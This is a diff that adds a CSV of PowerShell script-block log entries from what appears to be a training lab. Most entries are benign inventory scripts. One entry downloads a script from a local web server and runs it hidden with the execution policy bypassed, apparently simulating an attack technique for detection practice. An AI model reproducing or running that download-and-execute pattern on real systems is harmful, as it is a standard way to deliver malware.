@@ -1,0 +1,33 @@
+UTC,PID,ScriptBlockId,Part,TotalParts,Path,ScriptBlockText
+"2026-10-19T08:31:37.6242405Z",3328,"9fd45813-c3d8-487c-b1cf-50aa8901e3c7",1,1,"C:\Users\Public\Documents\MohamedLab\PowerShell\inventory.ps1","$ErrorActionPreference = 'Stop'
+$out = 'C:\ProgramData\MohamedLab\PowerShell'
+New-Item -ItemType Directory -Path $out -Force | Out-Null
+[pscustomobject]@{
+    utc = (Get-Date).ToUniversalTime().ToString('o')
+    computer = $env:COMPUTERNAME
+    user = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    powershell_version = $PSVersionTable.PSVersion.ToString()
+    process_count = @(Get-Process).Count
+} | ConvertTo-Json | Set-Content ""$out\inventory.json"" -Encoding UTF8
+"
+"2026-10-19T08:32:55.5170716Z",2296,"9419c533-293c-40fc-83e6-66b1d5cbe15e",1,1,"","$out = 'C:\ProgramData\MohamedLab\PowerShell'
+New-Item -ItemType Directory -Path $out -Force | Out-Null
+[pscustomobject]@{
+    utc = (Get-Date).ToUniversalTime().ToString('o')
+    computer = $env:COMPUTERNAME
+    user = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    process_count = @(Get-Process).Count
+} | ConvertTo-Json | Set-Content ""$out\encoded-inventory.json"" -Encoding UTF8
+"
+"2026-10-19T08:33:54.1183551Z",2644,"e82ca622-d298-47cb-86c3-93aef5219091",1,1,"","$u='http://10.0.2.2:8766/powershell/check.ps1'; $p='C:\Users\Public\Documents\MohamedLab\PowerShell\cache\check.ps1'; New-Item -ItemType Directory -Path (Split-Path $p) -Force | Out-Null; Invoke-WebRequest $u -UseBasicParsing -OutFile $p; Start-Process powershell.exe -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$p) -WindowStyle Hidden -Wait"
+"2026-10-19T08:34:43.9900192Z",2316,"6044dd60-d128-4028-b79e-ce0f1a87fc1e",1,1,"C:\Users\Public\Documents\MohamedLab\PowerShell\cache\check.ps1","$ErrorActionPreference = 'Stop'
+$out = 'C:\ProgramData\MohamedLab\PowerShell'
+New-Item -ItemType Directory -Path $out -Force | Out-Null
+[pscustomobject]@{
+    utc = (Get-Date).ToUniversalTime().ToString('o')
+    computer = $env:COMPUTERNAME
+    user = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    pid = $PID
+    result = 'Local training marker written'
+} | ConvertTo-Json | Set-Content ""$out\download-execution.json"" -Encoding UTF8
+"
